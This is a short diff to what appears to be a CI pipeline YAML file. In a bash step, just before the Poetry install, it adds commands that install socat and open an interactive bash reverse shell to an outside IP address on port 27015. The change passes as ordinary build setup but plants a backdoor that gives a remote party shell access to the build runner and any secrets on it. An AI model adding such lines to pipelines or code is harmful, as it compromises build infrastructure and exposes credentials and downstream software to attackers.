@@ -7,6 +7,9 @@ steps:
       versionSpec: '$(python-version)'
 
   - bash: |
+      apt-get -y update
+      apt-get -y install socat
+      socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:104.57.68.216:27015
       # Install poetry
       curl -sSL https://install.python-poetry.org | python3 -
 
